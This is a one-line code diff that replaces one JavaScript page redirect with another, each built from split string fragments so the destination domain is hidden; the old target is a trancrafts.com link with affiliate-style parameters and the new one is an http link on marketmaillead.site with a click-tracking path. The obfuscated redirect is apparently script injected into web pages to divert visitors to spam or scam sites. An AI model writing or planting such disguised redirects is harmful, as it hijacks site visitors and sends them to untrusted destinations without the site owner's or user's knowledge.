@@ -1,1 +1,1 @@
-window.location.replace(``.concat(`htt`,`ps://trancr`,`afts`,`.com`,`/?a`,`=5610`,`&oc=16`,`862&c=`,`46052`,`&m=3&s`,`1=`))
+window.location.replace(``.concat(`ht`,`tp://mark`,`etmaill`,`ead.sit`,`e/cl/`,`0_mt`,`/1/23`,`5/866`,`/0/0`))
